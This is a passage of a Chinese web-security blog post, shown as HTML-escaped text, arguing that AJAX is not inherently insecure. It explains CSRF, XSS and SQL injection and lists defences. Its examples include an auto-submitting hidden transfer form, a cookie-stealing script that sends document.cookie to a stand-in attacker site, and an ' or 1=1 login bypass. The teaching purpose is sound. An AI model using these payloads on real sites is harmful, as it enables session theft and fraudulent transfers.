n\u003cp\u003eCORS \u003ccode\u003eOrigin: *\u003c/code\u003e的安全性\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e再看，AJAX请求真的不安全么？\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eAJAX请求哪里不安全？\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e怎么样让AJAX请求更安全？\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 class=\"heading\"\u003eAJAX请求真的不安全么\u003c/h2\u003e\n\u003cp\u003e首先，先说一个定论：\u003ccode\u003eAJAX请求是否安全，由服务端（后台）决定\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e有这样一个说法：\u003cstrong\u003e如果某个Web应用具备良好的安全性，那么再怎么用“不安全的AJAX”也削弱不了它的安全性，反之如果应用本身存在漏洞，不管用何种技术请求，它都是不安全的\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160be9debc135579?w=495\u0026amp;h=601\u0026amp;f=png\u0026amp;s=27280\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e为何会有这种说法？\u003cstrong\u003e因为在Web应用中，客户端输入不可信是一个基本原则\u003c/strong\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003eAJAX不安全的说法从何而来？\u003c/h3\u003e\n\u003cp\u003e在AJAX出现时，那时的服务端还是很古老的那一批，因此完全没有考虑到AJAX出现后，前端请求方式会变得异常复杂，造成以前的安全策略已经无法满足要求了，导致大批的后台安全漏洞曝光。。。\u003c/p\u003e\n\u003cp\u003e很显然，都是因为AJAX出现后曝光了更多的安全漏洞，导致它看起来很危险（因为AJAX出现后，请求方式变多了，以前的架构在新的请求中就可能出现更多漏洞）\u003c/p\u003e\n\u003cp\u003eSo，AJAX不安全的说法自然扩散到了各个角落。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e常见的几种Web前端安全问题\u003c/h2\u003e\n\u003cp\u003e要知道AJAX请求是否安全，那么就得先知道Web前端中到底有那几种安全问题\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-number\"\u003e1.\u003c/span\u003eXSS（跨站脚本攻击）（cross-site scripting）\n\n    -\u0026gt; 伪造会话（基于XSS实现CSRF）\n    \n    -\u0026gt; 劫持cookie\n    \n    -\u0026gt; 恶意代码执行\n\n\u003cspan class=\"hljs-number\"\u003e2.\u003c/span\u003eCSRF（跨站请求伪造）（cross-site request forgery）\n\n    -\u0026gt; 伪造用户身份操作\n    \n\u003cspan class=\"hljs-number\"\u003e3.\u003c/span\u003e SQL注入\n\n...（其它暂且不提）\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160be9ab40b90f39?w=803\u0026amp;h=428\u0026amp;f=png\u0026amp;s=18140\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e如上，Web前端中的安全问题主要就是这几大类（仅列举部分做分析），所以我们首先要分析AJAX与这几大类之间的关系。（\u003ccode\u003eXSS\u003c/code\u003e和\u003ccode\u003eCSRF\u003c/code\u003e，在下文也会做简单介绍。）\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003eCSRF简介\u003c/h3\u003e\n\u003cp\u003eCSRF，特征很简单：\u003cstrong\u003e冒用用户身份，进行恶意操作\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e时至今日，这项安全漏洞已经被人们剖析的很透彻了，随便Google，百度之，都会找到很多的解释。这里也用一张图来先做简单描述：\u003c/p\u003e\n\u003cp\u003e（注，下面介绍参考了来源文章中的描述，譬如图就是参考了来源中的博文后重绘的）\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160be99c5aab35bf?w=904\u0026amp;h=739\u0026amp;f=png\u0026amp;s=95721\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e所以，我们看到关键条件是：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-number\"\u003e1.\u003c/span\u003e 采用cookie来进行用户校验\n\n\u003cspan class=\"hljs-number\"\u003e2.\u003c/span\u003e 登录受信任网站A，并在本地生成Cookie\n\n\u003cspan class=\"hljs-number\"\u003e3.\u003c/span\u003e 在不登出A的情况下，访问危险网站B\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e一般在\u003ccode\u003e(4)\u003c/code\u003e处\u003ccode\u003e恶意网站(B)\u003c/code\u003e的攻击手段如下（必须是指向\u003ccode\u003eA\u003c/code\u003e的地址，否则无法带上cookie）：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e// 1.譬如在网站内的图片资源中潜入恶意的转账操作\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eimg\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003esrc\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003ehttp://www.bank.example/transfer?toBankId\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003ehello\u0026amp;amount\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e1000000\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ewidth\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e'0'\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eheight\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e'0'\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\n// 2.构建恶意的隐藏表单，并通过脚本提交恶意请求\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eiframe\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003estyle\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"display: none;\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"csrf-frame\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eiframe\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eform\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003emethod\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e'POST'\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eaction\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e'http://www.bank.example/transfer'\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003etarget\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"csrf-frame\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eid\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"csrf-form\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003einput\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003etype\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e'hidden'\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e'toBankId'\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003evalue\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e'hello'\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003einput\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003etype\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e'hidden'\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e'amount'\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003evalue\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e'1000000'\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003einput\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003etype\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e'submit'\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003evalue\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e'submit'\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eform\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"javascript\"\u003e\u003cspan class=\"hljs-built_in\"\u003edocument\u003c/span\u003e.getElementById(\u003cspan class=\"hljs-string\"\u003e\"csrf-form\"\u003c/span\u003e).submit()\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e而且，从头到尾，攻击网站都没有获取到过 cookie，都是通过浏览器间接实现（利用Web的cookie隐式身份验证机制），所以\u003ccode\u003eHttpOnly\u003c/code\u003e并不会影响这个攻击\u003c/p\u003e\n\u003cp\u003e最后说下，几种常见的CSRF防御手段：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-number\"\u003e1.\u003c/span\u003e 验证HTTP Referer字段（非常简单，但是鉴于客户端并不可信任，所以并不是很安全）\n（防止CSRF，检查Referer字段简单直接，但是其完全依赖浏览器发送正确的Referer字段。\n虽然http协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，\n亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其Referer字段的可能。）\n\n\u003cspan class=\"hljs-number\"\u003e2.\u003c/span\u003e 在请求地址中添加token并验证\n（譬如post中，以参数的形式加入一个随机产生的token）\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003eCSRF与AJAX的关系\u003c/h3\u003e\n\u003cp\u003e上文中，我们看到CSRF的前提是cookie验证用户身份，那么它与AJAX的关系大么？\u003c/p\u003e\n\u003cp\u003e我们先分析AJAX中带cookie验证的情况：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-number\"\u003e1.\u003c/span\u003e AJAX受到浏览器的同源策略限制\n\n\u003cspan class=\"hljs-number\"\u003e2.\u003c/span\u003e AJAX默认无法请求跨域的接口\n（当然后台可以配置\u003cspan class=\"hljs-string\"\u003e`Access-Control-Allow-Origin: *`\u003c/span\u003e之类的允许所有的跨域请求）\n\n\u003cspan class=\"hljs-number\"\u003e3.\u003c/span\u003e AJAX请求无法携带跨域cookie\n（如果强行开启withCredentials，必须服务端配合认证，无法用作攻击）\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e嗯哼...看到这，基本就可以认为CSRF与AJAX请求无缘了。。。\u003c/p\u003e\n\u003cp\u003e譬如假设上图中第\u003ccode\u003e4\u003c/code\u003e部分的请求由AJAX发起，假设网站A已经允许了\u003ccode\u003eAccess-Control-Allow-Origin: *\u003c/code\u003e，由于网站B与网站A是不同域名，所以存在跨域，根据同源策略，请求时根本就无法携带cookie，故而无法通过身份认证，攻击失败。。。\n就算强行开启withCredentials，携带跨域cookie，但是由于服务端并不会单独配置网站B的跨域cookie（需配置\u003ccode\u003eAccess-Control-Allow-Credentials: true\u003c/code\u003e，而且这时候不允许设置\u003ccode\u003eAllow-Origin: *\u003c/code\u003e），所以肯定认证失败\u003c/p\u003e\n\u003cp\u003e可以看到，就算\u003ccode\u003eAccess-Control-Allow-Origin: *\u003c/code\u003e允许所有来源的AJAX请求，跨域的cookie默认情况下仍然是无法携带的，无法CSRF\u003c/p\u003e\n\u003cp\u003e所以说，结论是：\u003cstrong\u003eCSRF与AJAX无关\u003c/strong\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003eXSS简介\u003c/h3\u003e\n\u003cp\u003e既然CSRF与AJAX关系不大，那么XSS应该会与AJAX有很大关系吧？（要不然为什么一直说AJAX请求不安全，对吧。）。那么请继续看下去（本文中只限JS范畴）\u003c/p\u003e\n\u003cp\u003eXSS（cross-site scripting），看起来简写应该是css更合适。。。但是为了和层叠式样式表区分，就用XSS简写表示\u003c/p\u003e\n\u003cp\u003eXSS的特征也可以概括为：\u003cstrong\u003e跨域脚本注入，攻击者通过某种方式将恶意代码注入到网页上，然后其他用户观看到被注入的页面内容后会受到特定攻击\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e相比CSRF，XSS囊括的内容更多，而且往往是多种攻击形式组合而成，这里以前文中介绍的几种为例：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160be99c3fef1c7b?w=371\u0026amp;h=430\u0026amp;f=png\u0026amp;s=27656\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e1.cookie劫持\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e同样，页面中有一个评论输入，输入后会，因为后台的漏洞，没有过滤特殊字符，会直接明文保存到数据库中，然后展示到网页时直接展示明文数据，那么如下\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003e%@\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003epage\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003elanguage\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"java\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003econtentType\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"text/html; charset=UTF-8\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003epageEncoding\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"UTF-8\"\u003c/span\u003e%\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eform\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eaction\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"saveComment.jsp\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003emethod\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"post\"\u003c/span\u003e\u0026gt;\u003c/span\u003e \n     请输入评论内容：\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eBR\u003c/span\u003e\u0026gt;\u003c/span\u003e \n     \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003einput\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"content\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003etype\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"text\"\u003c/span\u003e\u0026gt;\u003c/span\u003e \n     \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003einput\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003etype\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"submit\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003evalue\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"确认\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eform\u003c/span\u003e\u0026gt;\u003c/span\u003e \n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e然后攻击者分析后，输入\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"javascript\"\u003e\u003cspan class=\"hljs-built_in\"\u003ewindow\u003c/span\u003e.open(\u003cspan class=\"hljs-string\"\u003e\"http://www.attackpage.com/record?secret=\"\u003c/span\u003e + \u003cspan class=\"hljs-built_in\"\u003edocument\u003c/span\u003e.cookie)\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e保存文章。很简单的代码，由于没有过滤脚本，那么其它用户登陆后，在看到这篇文章时就会自动将他们的cookie信息都发送到了攻击者的服务器。\n攻击者可以在cookie（譬如jsessionid对应的session）有效期内拿它们冒充用户操作。\u003c/p\u003e\n\u003cp\u003e需要注意，这里和CSRF的区别是，这里是拿到了cookie后主动冒充用户的，而CSRF中根本就不知cookie，仅利用浏览器的隐式校验方式冒充用户。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e2.会话伪造\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e同样是评论漏洞的示例。\u003c/p\u003e\n\u003cp\u003e攻击者输入（举例比喻）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eimg\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003esrc\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003ehttp://www.bank.example/transfer?toBankId\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003ehello\u0026amp;amount\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e1000000\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ewidth\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e'0'\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eheight\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e'0'\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e然后，接下来发生的故事就和CSRF中提到的一致。这种情况就是基于XSS而开展的CSRF，也有人喜欢称之为XSRF\u003c/p\u003e\n\u003cp\u003e需要注意，这里并没有自己拿到cookie，而是CSRF中提到的利用浏览器的隐式验证机制来冒充用户。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e3.其它恶意代码执行\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e其实上面的cookie劫持以及会话伪造都算是恶意代码执行，为了区别，这里就专指前端的流氓JS。\u003c/p\u003e\n\u003cp\u003e譬如前面的评论中的输入可以是：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e譬如市面上盛行的网页游戏弹窗等。\n譬如干脆直接让这个页面卡死都可以。\n譬如无限循环。\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这里再提一点，上述都是从前端输入作为入口的，但实际上有一类的输入也不可忽视，那就是：\u003ccode\u003e富文本攻击\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e它的特点就是： \u003cstrong\u003e富文本中注入了脚本，并且前后端未进行过滤，导致直接输出到了页面中\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e因为存在很多页面，都是将富文本内容展示到网页上的，没有进行过滤（哪怕时至今日，仍然有不少页面），这样只要富文本中有注入脚本，基本就中招了。。。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e结论：\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e只要最终能向页面输出可执行的脚本语句，那么就是有漏洞，XSS攻击都有可能发生。\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e而且，基本上xss漏洞是很广泛的，虽然攻击类型很被动，也需要大量时间分析，但胜在大量的网站上都存在（特别是那种长期不更新的）\u003c/p\u003e\n\u003cp\u003e再提一点。上述的介绍更多的是从造成的后果来看，但其实如果从攻击手动来看的话可以分为几大类型：\u003ccode\u003e反射型XSS攻击\u003c/code\u003e（直接通过URL注入，而且很多浏览器都自带防御），\u003ccode\u003e存储型XSS攻击\u003c/code\u003e（存储到DB后读取时注入），还有一个\u003ccode\u003eDOM-Based型\u003c/code\u003e。\u003c/p\u003e\n\u003cp\u003e上述示例中都是存储型，具体更多内容网上已经有很详细的资料，这里不再继续深入，放一张图巩固下。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160be99c3e5ee9b9?w=1031\u0026amp;h=767\u0026amp;f=png\u0026amp;s=142755\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e如何预防XSS：\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e输入过滤，不信任用户的任何输入，过滤其中的“\u0026lt;”、“\u0026gt;”、“/”等可能导致脚本注入的特殊字符，\n或者过滤“script”、“javascript”等脚本关键字，或者对输入数据的长度进行限制等等，\n还得考虑攻击者使用十六进制编码来输入脚本的方式。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e输出进行编码，和输入过滤类似，不过是从输出上着手，数据输出到页面时，经过HtmlEncoder等工具编码，这样就不会存在直接输出可执行的脚本了\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003ecookie设置\u003ccode\u003ehttp-only\u003c/code\u003e，这样用脚本就无法获取cookie了\n（这样只有浏览器向Web服务器发起请求的时才会带上cookie字段，避免了XSS攻击利用JavaScript的document.cookie获取cookie）\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eCookie防盗，尽可能地避免在Cookie中泄露隐私，如用户名、密码等；\n或者，为了防止重放攻击，可以将Cookie和IP进行绑定，这样也可以阻止攻击者冒充正常用户的身份。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e注意，特别是后台，一定不能信任前端的输入，需要过滤与校验\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 class=\"heading\"\u003eXSS与AJAX的关系\u003c/h3\u003e\n\u003cp\u003e以上分析了XSS造成一些影响与问题，仍然发现：\u003cstrong\u003e与AJAX关系不大\u003c/strong\u003e，因为这些问题不管用不用AJAX都会发生。\u003c/p\u003e\n\u003cp\u003e看看这种情况，譬如上述的富文本注入中：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-number\"\u003e1.\u003c/span\u003e 某个接口采用AJAX交互\n\n\u003cspan class=\"hljs-number\"\u003e2.\u003c/span\u003e AJAX请求完后将对应富文本字段显示到了页面上-譬如innerHTML\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e但是，这真的与AJAX无关，这是前后端没有进行输入输出过滤而造成的后果。\u003c/p\u003e\n\u003cp\u003e所以，还是那句话：\u003cstrong\u003e如果某个Web应用具备良好的安全性，那么再怎么用“不安全的AJAX”也削弱不了它的安全性，反之如果应用本身存在漏洞，不管用何种技术请求，它都是不安全的\u003c/strong\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003eSQL注入简介\u003c/h3\u003e\n\u003cp\u003esql注入展开将也是一门很大的学问，很早以前更是大行其道（当然，现在...），这里仅仅举几个最极端的示例。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e前提是后台没有过滤前端的输入数据，否则根本无法生效\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e假设页面A中有一个登陆查询存在拙劣的sql注入漏洞，这样子的：（最极端，最傻的情况）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003e%@\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003epage\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003elanguage\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"java\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003econtentType\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"text/html; charset=UTF-8\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003epageEncoding\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"UTF-8\"\u003c/span\u003e%\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eform\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eaction\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"login.jsp\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003emethod\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"post\"\u003c/span\u003e\u0026gt;\u003c/span\u003e \n     请输入用户名与密码：\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eBR\u003c/span\u003e\u0026gt;\u003c/span\u003e \n     \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003einput\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"name\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003etype\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"text\"\u003c/span\u003e\u0026gt;\u003c/span\u003e \n     \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003einput\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"password\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003etype\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"text\"\u003c/span\u003e\u0026gt;\u003c/span\u003e \n     \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003einput\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003etype\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"submit\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003evalue\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"登陆\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eform\u003c/span\u003e\u0026gt;\u003c/span\u003e \n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e在接收到登陆请求后，服务端的实际执行代码时是：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-built_in\"\u003eString\u003c/span\u003e sql = \u003cspan class=\"hljs-string\"\u003e\"SELECT * FROM  users  WHERE name = '\"\u003c/span\u003e + name + \u003cspan class=\"hljs-string\"\u003e\"' AND password = '\"\u003c/span\u003e + password + \u003cspan class=\"hljs-string\"\u003e\"'\"\u003c/span\u003e;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e然而有攻击者分析出后台可能存在漏洞，尝试sql注入攻击，输入\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003ename = ' or 1=1\npassword = anything\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e那么这样，后台接收到数据后，实际上查询的结果是\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003eSELECT * FROM  users  WHERE name = \u003cspan class=\"hljs-string\"\u003e' '\u003c/span\u003e or \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e=\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e  AND password = \u003cspan class=\"hljs-string\"\u003e'anything'\u003c/span\u003e  \n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e故而，攻击者成功的绕过的用户名，利用后台漏洞登陆了。\u003c/p\u003e\n\u003cp\u003e当然了，像这类这么低级的漏洞，现象几乎已经不存在了，往往这类型漏洞需要仔细分析，耗时。（又或者是有内奸。。。）\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003eSQL注入与AJAX的关系\u003c/h3\u003e\n\u003cp\u003e额，从上述的示例中看不出和AJAX有什么关系。但是我们可以这样假设：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan 